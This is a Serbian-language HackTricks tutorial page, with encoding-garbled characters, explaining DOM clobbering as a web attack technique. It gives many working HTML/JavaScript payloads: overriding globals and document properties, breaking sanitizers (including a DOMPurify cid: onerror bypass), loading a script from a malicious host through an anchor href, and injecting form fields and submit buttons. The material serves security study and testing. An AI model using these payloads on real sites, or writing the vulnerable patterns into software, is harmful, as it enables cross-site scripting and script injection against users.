# Dom Clobbering

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Å½elite li da vidite vaÅ¡u **kompaniju reklamiranu na HackTricks-u**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Osnove**

MoguÄ‡e je generisati **globalne promenljive unutar JS konteksta** sa atributima **`id`** i **`name`** u HTML tagovima.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Samo** odreÄ‘eni elementi mogu koristiti **name atribut** za clobbering globalnih promenljivih, a to su: `embed`, `form`, `iframe`, `image`, `img` i `object`.

Interesantno je da kada koristite **form element** za clobbering promenljive, dobiÄ‡ete vrednost **`toString`** samog elementa: `[object HTMLFormElement]`, ali sa **anchor**-om, **`toString`** Ä‡e biti **`href`** ankora. Stoga, ako koristite **`a`** oznaku za clobbering, moÅ¾ete **kontrolisati** vrednost kada se tretira kao string:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Nizovi i atributi

TakoÄ‘e je moguÄ‡e **zamijeniti niz** i **atribute objekta**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Da biste prebrisali **treÄ‡i atribut** (npr. x.y.z), morate koristiti **`formu`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Zamena viÅ¡e atributa je **komplikovanija, ali i dalje moguÄ‡a**, koriÅ¡Ä‡enjem iframa:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Stil tag se koristi da bi se **dalo dovoljno vremena iframe-u da se prikaÅ¾e**. Bez toga Ä‡ete dobiti upozorenje **nedefinisano**.
{% endhint %}

Da biste zamijenili dublje atribute, moÅ¾ete koristiti **iframes sa HTML enkodiranjem** na sledeÄ‡i naÄin:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Bypassiranje filtera**

Ako filter **petlja** kroz **svojstva** Ävora koristeÄ‡i neÅ¡to poput `document.getElementByID('x').attributes`, moÅ¾ete **prebrisati** svojstvo **`.attributes`** i **pokvariti filter**. Ostala DOM svojstva poput **`tagName`**, **`nodeName`** ili **`parentNode`** i druga takoÄ‘e su **prebrisiva**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

U JavaScript-u je Äesto moguÄ‡e pronaÄ‡i:
```javascript
var someObject = window.someObject || {};
```
Manipulacija HTML-a na stranici omoguÄ‡ava zamenu `someObject` sa DOM Ävorom, potencijalno uvodeÄ‡i sigurnosne ranjivosti. Na primer, moÅ¾ete zameniti `someObject` sa elementom sidra koji pokazuje na zlonamerni skript:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
U ranjivom kodu kao Å¡to je:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Ova metoda iskoriÅ¡Ä‡ava izvor skripte da izvrÅ¡i neÅ¾eljeni kod.

**Triks**: **`DOMPurify`** vam omoguÄ‡ava da koristite protokol **`cid:`**, koji **ne enkodira dvostruke navodnike**. To znaÄi da moÅ¾ete **ubaciti enkodirani dvostruki navodnik koji Ä‡e biti dekodiran pri izvrÅ¡avanju**. Stoga, ubacivanje neÄega poput **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** Ä‡e uÄiniti da HTML enkodirani `&quot;` bude **dekodiran pri izvrÅ¡avanju** i **izbegne** vrednost atributa da **kreira** dogaÄ‘aj **`onerror`**.

Druga tehnika koristi element **`form`**. OdreÄ‘ene klijentske biblioteke pregledaju atribute novostvorenog elementa forme da bi ih oÄistile. MeÄ‘utim, dodavanjem `input` sa `id=attributes` unutar forme, efektivno prepiÅ¡ete svojstvo atributa, spreÄavajuÄ‡i sanitizator da pristupi stvarnim atributima.

MoÅ¾ete [**pronaÄ‡i primer ovog tipa clobberinga u ovom CTF writeup-u**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Prepisivanje objekta dokumenta

Prema dokumentaciji, moguÄ‡e je prepisati atribute objekta dokumenta koristeÄ‡i DOM Clobbering:

> Interfejs [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [podrÅ¾ava imenovana svojstva](https://webidl.spec.whatwg.org/#dfn-support-named-properties). PodrÅ¾ana imena svojstava [Document](https://html.spec.whatwg.org/multipage/dom.html#document) objekta dokumenta u bilo kom trenutku sastoje se od sledeÄ‡eg, u [redosledu stabla](https://dom.spec.whatwg.org/#concept-tree-order) prema elementu koji ih je doprineo, ignoriÅ¡uÄ‡i kasnije duplikate, i sa vrednostima iz [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) atributa dolazeÄ‡i pre vrednosti iz atributa name kada isti element doprinosi oba:
>
> \- Vrednost atributa name sadrÅ¾aja za sve [izloÅ¾ene](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) i [izloÅ¾ene](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) elemente koji imaju neprazan atribut name sadrÅ¾aja i nalaze se [u stablu dokumenta](https://dom.spec.whatwg.org/#in-a-document-tree) sa dokumentom kao njihovim [korenom](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Vrednost atributa [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) sadrÅ¾aja za sve [izloÅ¾ene](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) elemente koji imaju neprazan atribut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) sadrÅ¾aja i nalaze se [u stablu dokumenta](https://dom.spec.whatwg.org/#in-a-document-tree) sa dokumentom kao njihovim [korenom](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Vrednost atributa [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) sadrÅ¾aja za sve [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) elemente koji imaju i neprazan atribut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) sadrÅ¾aja i neprazan atribut name sadrÅ¾aja, i nalaze se [u stablu dokumenta](https://dom.spec.whatwg.org/#in-a-document-tree) sa dokumentom kao njihovim [korenom](https://dom.spec.whatwg.org/#concept-tree-root).

KoriÅ¡Ä‡enjem ove tehnike moÅ¾ete prepisati Äesto koriÅ¡Ä‡ene **vrednosti kao Å¡to su `document.cookie`, `document.body`, `document.children`**, pa Äak i metode u interfejsu Document kao Å¡to je `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Pisanje nakon Å¡to je element prebrisao

Rezultati poziva **`document.getElementById()`** i **`document.querySelector()`** mogu biti promenjeni ubacivanjem `<html>` ili `<body>` oznake sa identiÄnim id atributom. Evo kako to moÅ¾e biti uraÄ‘eno:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Osim toga, primenom stilova za sakrivanje ovih ubaÄenih HTML/body oznaka, moÅ¾e se spreÄiti meÅ¡anje sa drugim tekstom u `innerText`, Äime se poboljÅ¡ava efikasnost napada:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
IstraÅ¾ivanja o SVG-u otkrila su da se oznaka `<body>` takoÄ‘e moÅ¾e efikasno koristiti:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Za HTML oznaku da funkcioniÅ¡e unutar SVG u pregledaÄima poput Chrome-a i Firefox-a, potrebna je oznaka `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering formi

MoguÄ‡e je dodati **nove unose unutar formulara** samo navoÄ‘enjem atributa `form` unutar odreÄ‘enih oznaka. MoÅ¾ete koristiti ovo da biste dodali nove vrednosti unutar formulara i Äak dodali novi **dugme** za **slanje** (clickjacking ili zloupotreba nekog `.click()` JS koda):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Za viÅ¡e atributa forme u [**button proverite ovo**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Reference

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript za hakere: NauÄite da razmiÅ¡ljate kao haker.

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Å½elite li da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
